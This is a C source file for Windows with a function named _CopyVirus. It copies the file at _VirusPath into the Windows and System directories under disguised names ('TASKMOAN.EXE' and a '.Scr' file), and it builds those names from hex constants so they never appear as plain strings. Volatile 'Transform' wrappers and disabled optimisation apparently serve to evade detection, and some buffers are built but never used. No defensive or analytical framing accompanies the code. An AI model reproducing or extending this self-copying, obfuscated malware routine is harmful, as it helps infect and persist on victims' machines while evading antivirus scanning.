#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <string.h>

void _CopyVirus(void)
{
    char windir[256];
    char windir2[256];
    char windoze[271];
    char windoze2[271];

    // Transform int len_windoze
    volatile int len_windoze_buf[2] = {{0, (int)0}};
    volatile int *p_len_windoze = (volatile int *)&len_windoze_buf[0];

    // Transform int len_windoze2
    volatile int len_windoze2_buf[2] = {{0, (int)0}};
    volatile int *p_len_windoze2 = (volatile int *)&len_windoze2_buf[0];

    // Transform int len_sysdoze
    volatile int len_sysdoze_buf[2] = {{0, (int)0}};
    volatile int *p_len_sysdoze = (volatile int *)&len_sysdoze_buf[0];

    // Transform int len_sysdoze2
    volatile int len_sysdoze2_buf[2] = {{0, (int)0}};
    volatile int *p_len_sysdoze2 = (volatile int *)&len_sysdoze2_buf[0];

    GetWindowsDirectoryA(windir, sizeof(windir));
    GetWindowsDirectoryA(windir2, sizeof(windir2));

    strcpy(windoze, windir);
    (*p_len_windoze) = strlen(windoze);

    *(uint32_t *)(windoze + (*p_len_windoze)) = 0x5341545c;
    *(uint32_t *)(windoze + (*p_len_windoze) + 4) = 0x414f4d4b;
    *(uint32_t *)(windoze + (*p_len_windoze) + 8) = 0x58452e4e;
    *((uint16_t *)(windoze + (*p_len_windoze) + 12)) = 0x45;

    strcpy(windoze2, windir2);
    (*p_len_windoze2) = strlen(windoze2);

    *(uint32_t *)(windoze2 + (*p_len_windoze2)) = 0x5341545c;
    *(uint32_t *)(windoze2 + (*p_len_windoze2) + 4) = 0x414f4d4b;
    *(uint32_t *)(windoze2 + (*p_len_windoze2) + 8) = 0x58452e4e;
    *((uint16_t *)(windoze2 + (*p_len_windoze2) + 12)) = 0x45;

    CopyFileA(_VirusPath, windoze, 0);

    char sysdir[256];
    char sysdir2[256];
    char sysdoze[271];
    char sysdoze2[271];

    GetSystemDirectoryA(sysdir, sizeof(sysdir));
    GetSystemDirectoryA(sysdir2, sizeof(sysdir2));

    strcpy(sysdoze, sysdir);
    (*p_len_sysdoze) = strlen(sysdoze);

    *(uint32_t *)(sysdoze + (*p_len_sysdoze)) = 0x6242425c;
    *(uint32_t *)(sysdoze + (*p_len_sysdoze) + 4) = 0x4244574c;
    *(uint32_t *)(sysdoze + (*p_len_sysdoze) + 8) = 0x7263532e;
    *((char *)(sysdoze + (*p_len_sysdoze) + 12)) = 0;

    strcpy(sysdoze2, sysdir2);
    (*p_len_sysdoze2) = strlen(sysdoze2);

    *(uint32_t *)(sysdoze2 + (*p_len_sysdoze2)) = 0x6242425c;
    *(uint32_t *)(sysdoze2 + (*p_len_sysdoze2) + 4) = 0x4244574c;
    *(uint32_t *)(sysdoze2 + (*p_len_sysdoze2) + 8) = 0x7263532e;
    *((char *)(sysdoze2 + (*p_len_sysdoze2) + 12)) = 0;

    CopyFileA(_VirusPath, sysdoze, 0);
}
#pragma optimize("", on)
